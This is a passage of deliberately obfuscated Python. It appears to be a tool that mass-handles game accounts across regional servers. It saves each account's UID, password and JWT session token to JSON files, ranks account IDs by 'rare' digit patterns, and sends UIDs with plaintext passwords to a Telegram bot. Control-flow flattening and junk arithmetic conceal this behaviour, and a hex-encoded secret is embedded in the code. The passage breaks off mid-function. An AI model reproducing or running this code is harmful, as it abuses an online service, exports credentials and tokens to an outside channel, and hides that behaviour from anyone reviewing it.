                    IllllllIlIllIIll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][21] * 791481 + 110
                    lllIlIIIlIllIlllIIlIl = 8788243
                    continue
                if lllIlIIIlIllIlllIIlIl == 3052742:
                    lllIlIIIlIllIlllIIlIl = 4840095
                    continue
                if lllIlIIIlIllIlllIIlIl == 9170680:
                    lIIIlIIlIllIlI = [llIllllIlllIlIlIlIllI >> 1 & 255 for lIllIlIlIIlIIlllIllIlIl in range(9)]
                    lllIlIIIlIllIlllIIlIl = 9628454
                    continue
        try:
            IlIlIIIIIIllIlII = 2593534
            while True:
                if IlIlIIIIIIllIlII == 8851792:
                    return getattr(self, '_write_fast')(filename, entry)
                    break
                if IlIlIIIIIIllIlII == 8163228:
                    entry = {'uid': account_data['uid'], 'password': account_data['password'], 'account_id': getattr(account_data, 'get')('account_id', 'N/A'), 'name': account_data['name'], 'region': 'GHOST' if is_ghost else getattr(account_data, 'get')('region', 'UNKNOWN'), 'rarity_level': rarity_level, 'rarity_score': rscore, 'reason': reason, 'date_identified': getattr(getattr(IllIIIIlIIllIIIIIIllll, 'now')(), 'strftime')('%Y-%m-%d %H:%M:%S.%f')[:-3], 'jwt_token': getattr(account_data, 'get')('jwt_token', ''), 'thread_id': getattr(account_data, 'get')('thread_id', 'N/A'), 'saved_at': getattr(IlllllIIllIIllIIll, 'time')()}
                    IlIlIIIIIIllIlII = 8851792
                    continue
                if IlIlIIIIIIllIlII == 2593534:
                    if is_ghost:
                        filename = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lIlIlIIlIllllIllIl, 'rare-ghost.json')
                    else:
                        llllllIllIlllIIlI = 8689155
                        while True:
                            if llllllIllIlllIIlI == 8689155:
                                region = getattr(account_data, 'get')('region', 'UNKNOWN')
                                llllllIllIlllIIlI = 6805252
                                continue
                            if llllllIllIlllIIlI == 3698768:
                                llllllIllIlllIIlI = 3698768
                                continue
                            if llllllIllIlllIIlI == 8218173:
                                filename = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(llIlIIlIlllIIIIllIllllII, f'{getattr(rarity_level, 'lower')()}-{region}.json')
                                break
                            if llllllIllIlllIIlI == 8875717:
                                llllllIllIlllIIlI = 8218173
                                continue
                            if llllllIllIlllIIlI == 6805252:
                                if rarity_level == 'LEGENDARY':
                                    llIlIIlIlllIIIIllIllllII = IIIlIlIlIIlIlIlIlIIIll
                                elif rarity_level == 'MYTHIC':
                                    llIlIIlIlllIIIIllIllllII = IIIllllllIIIIIIIllIIl
                                elif rarity_level == 'EPIC':
                                    llIlIIlIlllIIIIllIllllII = llIlIlIlIlIlllIlllI
                                else:
                                    llIlIIlIlllIIIIllIllllII = lllIllIIlIlIIIlII
                                llllllIllIlllIIlI = 8218173
                                continue
                    IlIlIIIIIIllIlII = 8163228
                    continue
                if IlIlIIIIIIllIlII == 5228331:
                    IlIlIIIIIIllIlII = 8163228
                    continue
        except:
            return False

    def save_jwt(self, account_data, jwt_token, region, is_ghost=False):
        try:
            llIIIIlIIIIlIlIlllIlIIll = 5330472
            while True:
                if llIIIIlIIIIlIlIlllIlIIll == 5330472:
                    if is_ghost:
                        filename = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lIIIIlIIllIIIIIIIIll, 'tokens-ghost.json')
                    else:
                        filename = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lIIIIIlIlllIlIIl, f'tokens-{region}.json')
                    llIIIIlIIIIlIlIlllIlIIll = 4483840
                    continue
                if llIIIIlIIIIlIlIlllIlIIll == 3909731:
                    llIIIIlIIIIlIlIlllIlIIll = 4483840
                    continue
                if llIIIIlIIIIlIlIlllIlIIll == 4483840:
                    entry = {'uid': account_data['uid'], 'account_id': getattr(account_data, 'get')('account_id', 'N/A'), 'jwt_token': jwt_token, 'name': account_data['name'], 'password': account_data['password'], 'date_time': getattr(getattr(IllIIIIlIIllIIIIIIllll, 'now')(), 'strftime')('%Y-%m-%d %H:%M:%S.%f')[:-3], 'region': 'GHOST' if is_ghost else region, 'thread_id': getattr(account_data, 'get')('thread_id', 'N/A'), 'saved_at': getattr(IlllllIIllIIllIIll, 'time')()}
                    llIIIIlIIIIlIlIlllIlIIll = 7951685
                    continue
                if llIIIIlIIIIlIlIlllIlIIll == 2865533:
                    llIIIIlIIIIlIlIlllIlIIll = 5330472
                    continue
                if llIIIIlIIIIlIlIlllIlIIll == 7951685:
                    return getattr(self, '_write_fast')(filename, entry)
                    break
                if llIIIIlIIIIlIlIlllIlIIll == 6076221:
                    llIIIIlIIIIlIlIlllIlIIll = 4483840
                    continue
        except:
            return False

    def stop(self):
        IIIlIlIlIIIlllIlIl = 2682271
        while True:
            if IIIlIlIlIIIlllIlIl == 2682271:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][3] == 251:
                    lIllIIIIIIlllIIl = 2516517
                    while True:
                        if lIllIIIIIIlllIIl == 1534284:
                            lIllIIIIIIlllIIl = 1534284
                            continue
                        if lIllIIIIIIlllIIl == 2503509:
                            lIllllllIIlIll = sum(lIIIlllIlIIIIIIlIlIlIIl) + IlIIlIlllllIIIIIIIIl % 74 - lIIlIIIIIlIlIlIIlIlIIIll
                            break
                        if lIllIIIIIIlllIIl == 4686396:
                            IlIIlIlllllIIIIIIIIl = (lIIlIIIIIlIlIlIIlIlIIIll * 7 ^ 9239446) & 4294967295
                            lIllIIIIIIlllIIl = 2082684
                            continue
                        if lIllIIIIIIlllIIl == 2082684:
                            lIIIlllIlIIIIIIlIlIlIIl = [IlIIlIlllllIIIIIIIIl >> 8 & 255 for llIlIlIIllIllllIlllI in range(7)]
                            lIllIIIIIIlllIIl = 2503509
                            continue
                        if lIllIIIIIIlllIIl == 2516517:
                            lIIlIIIIIlIlIlIIlIlIIIll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][15] * 222808 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][12]
                            lIllIIIIIIlllIIl = 4686396
                            continue
                IIIlIlIlIIIlllIlIl = 4582570
                continue
            if IIIlIlIlIIIlllIlIl == 7095875:
                IIIlIlIlIIIlllIlIl = 4339912
                continue
            if IIIlIlIlIIIlllIlIl == 6542877:
                if getattr(self, 'retry_queue'):
                    with getattr(self, 'retry_lock'):
                        llIIllIIIIllIlIlIIll = getattr(getattr(self, 'retry_queue'), 'copy')()
                        setattr(self, 'retry_queue', [])
                    for IIIllIIlllIIIlIlIllIllIl in llIIllIIIIllIlIlIIll:
                        getattr(self, '_write_fast')(IIIllIIlllIIIlIlIllIllIl['filename'], IIIllIIlllIIIlIlIllIllIl['entry'], max_retries=3)
                break
            if IIIlIlIlIIIlllIlIl == 8043749:
                IIIlIlIlIIIlllIlIl = 6034194
                continue
            if IIIlIlIlIIIlllIlIl == 4582570:
                setattr(self, 'running', False)
                IIIlIlIlIIIlllIlIl = 4339912
                continue
            if IIIlIlIlIIIlllIlIl == 6034194:
                IIIlIlIlIIIlllIlIl = 7095875
                continue
            if IIIlIlIlIIIlllIlIl == 4339912:
                getattr(IlllllIIllIIllIIll, 'sleep')(1)
                IIIlIlIlIIIlllIlIl = 6542877
                continue
lIIlIIIIlIllII = IllllllllIlIllIlIll()

def IllIIlIllIlIlIlIIIIl(account_data, region, is_ghost=False):
    if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][27] == 180:
        IlIllllIlIIIlllIllIIIlI = 6215735
        while True:
            if IlIllllIlIIIlllIllIIIlI == 6215735:
                lllllIIIlIIlll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][26] * 49111 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][6]
                IlIllllIlIIIlllIllIIIlI = 5740155
                continue
            if IlIllllIlIIIlllIllIIIlI == 6673666:
                IIIlllIIlllIlIIlIIllIII = [lIlllIIlllllIIllIIIIII >> 5 & 255 for IIllllllIIlIllllllIIll in range(8)]
                IlIllllIlIIIlllIllIIIlI = 1551443
                continue
            if IlIllllIlIIIlllIllIIIlI == 2267489:
                IlIllllIlIIIlllIllIIIlI = 6215735
                continue
            if IlIllllIlIIIlllIllIIIlI == 5740155:
                lIlllIIlllllIIllIIIIII = (lllllIIIlIIlll * 8 ^ 15126467) & 65535
                IlIllllIlIIIlllIllIIIlI = 6673666
                continue
            if IlIllllIlIIIlllIllIIIlI == 7938640:
                IlIllllIlIIIlllIllIIIlI = 5740155
                continue
            if IlIllllIlIIIlllIllIIIlI == 1551443:
                llIllIIllIlIll = sum(IIIlllIIlllIlIIlIIllIII) + lIlllIIlllllIIllIIIIII % 13 - lllllIIIlIIlll
                break
            if IlIllllIlIIIlllIllIIIlI == 5769204:
                IlIllllIlIIIlllIllIIIlI = 5740155
                continue
    return getattr(lIIlIIIIlIllII, 'save_normal')(account_data, region, is_ghost)

def IllIIIlIIIlIIllIIIIlIIlI(account_data, rarity_level, reason, rscore, is_ghost=False):
    if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][19] == 212:
        IlIIlIIlllIIIlIllIlIlI = 5843566
        while True:
            if IlIIlIIlllIIIlIllIlIlI == 7120651:
                IlIIlIIlllIIIlIllIlIlI = 7120651
                continue
            if IlIIlIIlllIIIlIllIlIlI == 1533621:
                llIIlIlllIllIlIIlIIII = sum(llllIIIlIIIlll) + IIIllIIllIlllIIIlIIllIll % 11 - lIIIIlIlIIllIIlI
                break
            if IlIIlIIlllIIIlIllIlIlI == 5843566:
                lIIIIlIlIIllIIlI = 33851258 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][12]
                IlIIlIIlllIIIlIllIlIlI = 8339387
                continue
            if IlIIlIIlllIIIlIllIlIlI == 5815754:
                llllIIIlIIIlll = [IIIllIIllIlllIIIlIIllIll >> 8 & 255 for llIIIIIIlllIlllllIlII in range(9)]
                IlIIlIIlllIIIlIllIlIlI = 1533621
                continue
            if IlIIlIIlllIIIlIllIlIlI == 4482839:
                IlIIlIIlllIIIlIllIlIlI = 4482839
                continue
            if IlIIlIIlllIIIlIllIlIlI == 8339387:
                IIIllIIllIlllIIIlIIllIll = (lIIIIlIlIIllIIlI * 9 ^ 1880941) & 65535
                IlIIlIIlllIIIlIllIlIlI = 5815754
                continue
    return getattr(lIIlIIIIlIllII, 'save_rare')(account_data, rarity_level, reason, rscore, is_ghost)

def llllllIIIIIIIlIllII(account_data, jwt_token, region, is_ghost=False):
    return getattr(lIIlIIIIlIllII, 'save_jwt')(account_data, jwt_token, region, is_ghost)

def llIIIlIIlllIIIll(filepath):
    try:
        if not getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'exists')(filepath):
            return []
        with open(filepath, 'r', encoding='utf-8') as f:
            lIlIlIlllIlIIIlIllIlI = 9269468
            while True:
                if lIlIlIlllIlIIIlIllIlI == 8796875:
                    lIlIlIlllIlIIIlIllIlI = 9269468
                    continue
                if lIlIlIlllIlIIIlIllIlI == 5744915:
                    return []
                    break
                if lIlIlIlllIlIIIlIllIlI == 9269468:
                    data = getattr(json, 'load')(f)
                    lIlIlIlllIlIIIlIllIlI = 1316049
                    continue
                if lIlIlIlllIlIIIlIllIlI == 1316049:
                    if isinstance(data, list):
                        return data
                    lIlIlIlllIlIIIlIllIlI = 5744915
                    continue
                if lIlIlIlllIlIIIlIllIlI == 1463683:
                    lIlIlIlllIlIIIlIllIlI = 8796875
                    continue
    except:
        return []
IlllIlllIIlllIIlI = {'ME': 'ar', 'IND': 'hi', 'ID': 'id', 'VN': 'vi', 'TH': 'th', 'BD': 'bn', 'PK': 'ur', 'TW': 'zh', 'CIS': 'ru', 'SAC': 'es'}
IllIlIIlIllllIIl = getattr(bytes, 'fromhex')('32656534343831396539623435393838343531343130363762323831363231383734643064356437616639643866376530306331653534373135623764316533')
lIlIlIlllIllIIIlIll = {'R4': ['(\\d)\\1{3,}', 5], 'R3': ['(\\d)\\1\\1(\\d)\\2\\2', 4], 'S5': ['(12345|23456|34567|45678|56789)', 6], 'S4': ['(0123|1234|2345|3456|4567|5678|6789|9876|8765|7654|6543|5432|4321|3210)', 5], 'P6': ['^(\\d)(\\d)(\\d)\\3\\2\\1$', 7], 'P4': ['^(\\d)(\\d)\\2\\1$', 5], 'SPH': ['(69|420|1337|007)', 6], 'SPM': ['(100|200|300|400|500|666|777|888|999)', 4], 'QD': ['(1111|2222|3333|4444|5555|6666|7777|8888|9999|0000)', 6], 'MH': ['^(\\d{2,3})\\1$', 5], 'MM': ['(\\d{2})0\\1', 4], 'GD': ['1618|0618', 5], 'ULTRA_R4': ['(\\d)\\1{5,}', 10], 'ULTRA_PAL': ['^(\\d)(\\d)(\\d)\\2\\1$', 8], 'ULTRA_MIRROR': ['^(\\d{3})(\\d{3})\\1$', 9], 'ULTRA_SEQ': ['(012345|123456|234567|345678|456789|987654|876543|765432|654321)', 8], 'ULTRA_QUAD': ['(\\d{4})\\1', 8], 'ULTRA_BINARY': ['^[01]+$', 7], 'ULTRA_REPEAT': ['(\\d{2})\\1\\1', 7]}

class IllIIIlIllIIlIIl:

    def __init__(self):
        IlIIlIIIIlIIIll = 8486848
        while True:
            if IlIIlIIIIlIIIll == 2241620:
                setattr(self, 'total_legendary', 0)
                IlIIlIIIIlIIIll = 3037988
                continue
            if IlIIlIIIIlIIIll == 8833286:
                setattr(self, 'lock', getattr(IlIlIllllIlllIIIIll, 'Lock')())
                break
            if IlIIlIIIIlIIIll == 7068529:
                setattr(self, 'start_time', 0)
                IlIIlIIIIlIIIll = 4072344
                continue
            if IlIIlIIIIlIIIll == 4742308:
                setattr(self, 'total_mythic', 0)
                IlIIlIIIIlIIIll = 8987845
                continue
            if IlIIlIIIIlIIIll == 7221029:
                setattr(self, 'epic_list', [])
                IlIIlIIIIlIIIll = 8897018
                continue
            if IlIIlIIIIlIIIll == 6332829:
                setattr(self, 'bot_token', None)
                IlIIlIIIIlIIIll = 3141340
                continue
            if IlIIlIIIIlIIIll == 2196229:
                setattr(self, 'chat_id', None)
                IlIIlIIIIlIIIll = 8612674
                continue
            if IlIIlIIIIlIIIll == 8486848:
                IlIIlIIIIlIIIll = 9735657
                continue
            if IlIIlIIIIlIIIll == 3037988:
                setattr(self, 'total_epic', 0)
                IlIIlIIIIlIIIll = 4742308
                continue
            if IlIIlIIIIlIIIll == 3141340:
                setattr(self, 'bot_chat_id', None)
                IlIIlIIIIlIIIll = 9798487
                continue
            if IlIIlIIIIlIIIll == 9735657:
                setattr(self, 'token', None)
                IlIIlIIIIlIIIll = 2196229
                continue
            if IlIIlIIIIlIIIll == 8612674:
                setattr(self, 'connected', False)
                IlIIlIIIIlIIIll = 9585861
                continue
            if IlIIlIIIIlIIIll == 9798487:
                setattr(self, 'running', False)
                IlIIlIIIIlIIIll = 7068529
                continue
            if IlIIlIIIIlIIIll == 4072344:
                setattr(self, 'region', None)
                IlIIlIIIIlIIIll = 5636642
                continue
            if IlIIlIIIIlIIIll == 8897018:
                setattr(self, 'mythic_list', [])
                IlIIlIIIIlIIIll = 8833286
                continue
            if IlIIlIIIIlIIIll == 5636642:
                setattr(self, 'target', 0)
                IlIIlIIIIlIIIll = 2241620
                continue
            if IlIIlIIIIlIIIll == 9585861:
                setattr(self, 'ui_mode', 'CLEAN')
                IlIIlIIIIlIIIll = 6332829
                continue
            if IlIIlIIIIlIIIll == 3208713:
                IlIIlIIIIlIIIll = 3141340
                continue
            if IlIIlIIIIlIIIll == 8987845:
                setattr(self, 'legendary_list', [])
                IlIIlIIIIlIIIll = 7221029
                continue

    def set_credentials(self, token, chat_id):
        lllllIIIllIIIIIllII = 5517106
        while True:
            if lllllIIIllIIIIIllII == 4141871:
                setattr(self, 'bot_token', token)
                lllllIIIllIIIIIllII = 3896949
                continue
            if lllllIIIllIIIIIllII == 5361489:
                return getattr(self, 'test_connection')()
                break
            if lllllIIIllIIIIIllII == 5517106:
                lllllIIIllIIIIIllII = 4141871
                continue
            if lllllIIIllIIIIIllII == 3896949:
                setattr(self, 'bot_chat_id', chat_id)
                lllllIIIllIIIIIllII = 5361489
                continue
            if lllllIIIllIIIIIllII == 5842238:
                lllllIIIllIIIIIllII = 5517106
                continue
            if lllllIIIllIIIIIllII == 8247587:
                lllllIIIllIIIIIllII = 4141871
                continue
            if lllllIIIllIIIIIllII == 9516282:
                lllllIIIllIIIIIllII = 5517106
                continue

    def test_connection(self):
        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][27] == 13:
            IIIllIIlIIIIIlI = 9973559
            while True:
                if IIIllIIlIIIIIlI == 8628366:
                    lIllllllllIIIll = [IIlIlIllIIIIIll >> 7 & 255 for IIlIlIllIIlIlIllIllI in range(7)]
                    IIIllIIlIIIIIlI = 9457483
                    continue
                if IIIllIIlIIIIIlI == 2352102:
                    IIIllIIlIIIIIlI = 9973559
                    continue
                if IIIllIIlIIIIIlI == 9457483:
                    llIllIIIlIIIllIlIllll = sum(lIllllllllIIIll) + IIlIlIllIIIIIll % 55 - lIIIIIlIlIIlIlIIlIl
                    break
                if IIIllIIlIIIIIlI == 7561069:
                    IIlIlIllIIIIIll = (lIIIIIlIlIIlIlIIlIl * 7 ^ 6972379) & 65535
                    IIIllIIlIIIIIlI = 8628366
                    continue
                if IIIllIIlIIIIIlI == 9973559:
                    lIIIIIlIlIIlIlIIlIl = 109472448 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][26]
                    IIIllIIlIIIIIlI = 7561069
                    continue
        try:
            IIllIIIIIIIllIlIIl = 8043745
            while True:
                if IIllIIIIIIIllIlIIl == 5149352:
                    if getattr(response, 'status_code') == 200:
                        setattr(self, 'connected', True)
                        return True
                    IIllIIIIIIIllIlIIl = 8527404
                    continue
                if IIllIIIIIIIllIlIIl == 8527404:
                    return False
                    break
                if IIllIIIIIIIllIlIIl == 8043745:
                    url = f'https://api.telegram.org/bot{getattr(self, 'bot_token')}/getMe'
                    IIllIIIIIIIllIlIIl = 8658404
                    continue
                if IIllIIIIIIIllIlIIl == 8658404:
                    response = getattr(requests, 'get')(url, timeout=10)
                    IIllIIIIIIIllIlIIl = 5149352
                    continue
                if IIllIIIIIIIllIlIIl == 9027968:
                    IIllIIIIIIIllIlIIl = 5149352
                    continue
        except:
            return False

    def send_message(self, text, parse_mode='HTML'):
        lIIllIIlIIlIIlllIIIIIll = 7450502
        while True:
            if lIIllIIlIIlIIlllIIIIIll == 7450502:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][4] == 190:
                    llllllIlIIIIIlllI = 2558843
                    while True:
                        if llllllIlIIIIIlllI == 4904433:
                            lIIIllIIIlIIllIlI = (lIIIllIIIlIlIlIIlIIlIllI * 8 ^ 10481139) & 16777215
                            llllllIlIIIIIlllI = 2385046
                            continue
                        if llllllIlIIIIIlllI == 2385046:
                            IlIllIIllllIllIIIll = [lIIIllIIIlIIllIlI >> 11 & 255 for IlIIIlIlIllllIIIll in range(8)]
                            llllllIlIIIIIlllI = 3861952
                            continue
                        if llllllIlIIIIIlllI == 8799841:
                            llllllIlIIIIIlllI = 1108559
                            continue
                        if llllllIlIIIIIlllI == 2790647:
                            llllllIlIIIIIlllI = 8799841
                            continue
                        if llllllIlIIIIIlllI == 2558843:
                            lIIIllIIIlIlIlIIlIIlIllI = 45693984
                            llllllIlIIIIIlllI = 4904433
                            continue
                        if llllllIlIIIIIlllI == 1108559:
                            llllllIlIIIIIlllI = 8799841
                            continue
                        if llllllIlIIIIIlllI == 3861952:
                            llIllIIlllllIlllIlIIlIII = sum(IlIllIIllllIllIIIll) + lIIIllIIIlIIllIlI % 78 - lIIIllIIIlIlIlIIlIIlIllI
                            break
                lIIllIIlIIlIIlllIIIIIll = 4786055
                continue
            if lIIllIIlIIlIIlllIIIIIll == 4786055:
                if not getattr(self, 'connected') or not getattr(self, 'bot_token') or (not getattr(self, 'bot_chat_id')):
                    return False
                lIIllIIlIIlIIlllIIIIIll = 9374443
                continue
            if lIIllIIlIIlIIlllIIIIIll == 7217174:
                lIIllIIlIIlIIlllIIIIIll = 7217174
                continue
            if lIIllIIlIIlIIlllIIIIIll == 9374443:
                try:
                    IlIlIIlllIlIIllIIlIlIl = 6130548
                    while True:
                        if IlIlIIlllIlIIllIIlIlIl == 6130548:
                            url = f'https://api.telegram.org/bot{getattr(self, 'bot_token')}/sendMessage'
                            IlIlIIlllIlIIllIIlIlIl = 1360433
                            continue
                        if IlIlIIlllIlIIllIIlIlIl == 1360433:
                            lllIIIllIlIlIIIlll = {'chat_id': getattr(self, 'bot_chat_id'), 'text': text, 'parse_mode': parse_mode}
                            IlIlIIlllIlIIllIIlIlIl = 3074321
                            continue
                        if IlIlIIlllIlIIllIIlIlIl == 1789895:
                            IlIlIIlllIlIIllIIlIlIl = 5233897
                            continue
                        if IlIlIIlllIlIIllIIlIlIl == 9181761:
                            return getattr(response, 'status_code') == 200
                            break
                        if IlIlIIlllIlIIllIIlIlIl == 5233897:
                            IlIlIIlllIlIIllIIlIlIl = 9181761
                            continue
                        if IlIlIIlllIlIIllIIlIlIl == 5217219:
                            IlIlIIlllIlIIllIIlIlIl = 9181761
                            continue
                        if IlIlIIlllIlIIllIIlIlIl == 3074321:
                            response = getattr(requests, 'post')(url, json=lllIIIllIlIlIIIlll, timeout=10)
                            IlIlIIlllIlIIllIIlIlIl = 9181761
                            continue
                except:
                    return False
                break

    def send_bot_on(self):
        llllIllIIlllllIIlII = 1513201
        while True:
            if llllIllIIlllllIIlII == 2754724:
                text = f'🤖 <b>BOT TELEGRAM ACTIVE!</b>\n\n✅ <b>Status:</b> ONLINE\n🌍 <b>Region:</b> {getattr(self, 'region')}\n🎯 <b>Target:</b> {getattr(self, 'target'):,} accounts\n⏰ <b>Started:</b> {getattr(getattr(IllIIIIlIIllIIIIIIllll, 'now')(), 'strftime')('%Y-%m-%d %H:%M:%S')}\n\n<b>📊 Monitoring:</b>\n🔥 LEGENDARY (Score 20+)\n💜 MYTHIC (Score 15-19)\n💜 EPIC (Score 11-14)\n\n#JONSKY #BotON\n'
                llllIllIIlllllIIlII = 5253301
                continue
            if llllIllIIlllllIIlII == 1513201:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][17] ^ 135 == 389:
                    IIlIlIlIlIllllIllIll = 4224890
                    while True:
                        if IIlIlIlIlIllllIllIll == 3040933:
                            IIIlIlIIIIIIIlIlIIll = sum(IIIIIIlIIIllllIllllIlll) + IIIlIlIIIIIlII % 8 - lIIIlIIIlIlIlIIlIlIIl
                            break
                        if IIlIlIlIlIllllIllIll == 1030056:
                            IIlIlIlIlIllllIllIll = 2661055
                            continue
                        if IIlIlIlIlIllllIllIll == 8409264:
                            IIlIlIlIlIllllIllIll = 1030056
                            continue
                        if IIlIlIlIlIllllIllIll == 8202941:
                            IIIlIlIIIIIlII = (lIIIlIIIlIlIlIIlIlIIl * 2 ^ 1096916) & 65535
                            IIlIlIlIlIllllIllIll = 6562830
                            continue
                        if IIlIlIlIlIllllIllIll == 4224890:
                            lIIIlIIIlIlIlIIlIlIIl = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][25] * 267043 + 140
                            IIlIlIlIlIllllIllIll = 8202941
                            continue
                        if IIlIlIlIlIllllIllIll == 6562830:
                            IIIIIIlIIIllllIllllIlll = [IIIlIlIIIIIlII >> 10 & 255 for lIIIllIIIIllIlllII in range(2)]
                            IIlIlIlIlIllllIllIll = 3040933
                            continue
                        if IIlIlIlIlIllllIllIll == 2661055:
                            IIlIlIlIlIllllIllIll = 2661055
                            continue
                llllIllIIlllllIIlII = 2754724
                continue
            if llllIllIIlllllIIlII == 5253301:
                getattr(self, 'send_message')(text)
                break
            if llllIllIIlllllIIlII == 6788391:
                llllIllIIlllllIIlII = 2754724
                continue
            if llllIllIIlllllIIlII == 3281315:
                llllIllIIlllllIIlII = 3281315
                continue

    def send_legendary(self, uid, aid, pwd, name, score):
        lIIIIlIIlIllIl = 6882298
        while True:
            if lIIIIlIIlIllIl == 8370154:
                IIlIIIlllIlllIIIIlIllIII = getattr(getattr(IllIIIIlIIllIIIIIIllll, 'now')(), 'strftime')('%Y-%m-%d %H:%M:%S')
                lIIIIlIIlIllIl = 5793833
                continue
            if lIIIIlIIlIllIl == 6882298:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][13] == 77:
                    IIIIlIllIIllIIIl = 9972547
                    while True:
                        if IIIIlIllIIllIIIl == 5079880:
                            IIIllIlIIlIlIlIIIIIIIlI = sum(llllllIlIIlIllIIIl) + IIIlllIllIllIlIIIlIIll % 86 - llIlIIlIIIIIllIIllllII
                            break
                        if IIIIlIllIIllIIIl == 8222399:
                            IIIIlIllIIllIIIl = 4472251
                            continue
                        if IIIIlIllIIllIIIl == 3136023:
                            llllllIlIIlIllIIIl = [IIIlllIllIllIlIIIlIIll >> 12 & 255 for llIIIIlIIlIllIlll in range(7)]
                            IIIIlIllIIllIIIl = 5079880
                            continue
                        if IIIIlIllIIllIIIl == 8726666:
                            IIIIlIllIIllIIIl = 6778199
                            continue
                        if IIIIlIllIIllIIIl == 6778199:
                            IIIlllIllIllIlIIIlIIll = (llIlIIlIIIIIllIIllllII * 7 ^ 5362228) & 4294967295
                            IIIIlIllIIllIIIl = 3136023
                            continue
                        if IIIIlIllIIllIIIl == 9972547:
                            llIlIIlIIIIIllIIllllII = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][4] * 648678 + 192
                            IIIIlIllIIllIIIl = 6778199
                            continue
                        if IIIIlIllIIllIIIl == 4472251:
                            IIIIlIllIIllIIIl = 9972547
                            continue
                lIIIIlIIlIllIl = 6132153
                continue
            if lIIIIlIIlIllIl == 5793833:
                text = f'🔥 <b>LEGENDARY FOUND!</b> 🔥\n\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n<b>UID</b> | <b>ID</b> | <b>PASSWORD</b>\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n<code>{uid}</code> | <code>{aid}</code> | <code>{pwd}</code>\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n<b>👤 Name:</b> <code>{name}</code>\n<b>📊 Score:</b> {score}\n<b>🌍 Region:</b> {getattr(self, 'region')}\n<b>⏰ Time:</b> <code>{IIlIIIlllIlllIIIIlIllIII}</code>\n<b>📦 Total Legendary:</b> {getattr(self, 'total_legendary')}\n\n#JONSKY #LEGENDARY\n'
                lIIIIlIIlIllIl = 8432677
                continue
            if lIIIIlIIlIllIl == 8432677:
                getattr(self, 'send_message')(text)
                break
            if lIIIIlIIlIllIl == 4026577:
                lIIIIlIIlIllIl = 5793833
                continue
            if lIIIIlIIlIllIl == 6132153:
                with getattr(self, 'lock'):
                    self.total_legendary += 1
                    getattr(getattr(self, 'legendary_list'), 'append')({'uid': uid, 'aid': aid, 'pwd': pwd, 'name': name, 'score': score})
                lIIIIlIIlIllIl = 8370154
                continue

    def send_completion(self):
        IlIIllIIlIIlllIIllIl = 3194477
        while True:
            if IlIIllIIlIIlllIIllIl == 8929825:
                IlIIllIIlIIlllIIllIl = 9765439
                continue
            if IlIIllIIlIIlllIIllIl == 5509617:
                getattr(self, 'send_message')(text)
                break
            if IlIIllIIlIIlllIIllIl == 3194477:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][14] * 4 + 173 == 782:
                    lIlIlIllIlIIIIIllIllIII = 9046190
                    while True:
                        if lIlIlIllIlIIIIIllIllIII == 2478529:
                            lIlIlIllIlIIIIIllIllIII = 7617633
                            continue
                        if lIlIlIllIlIIIIIllIllIII == 2859855:
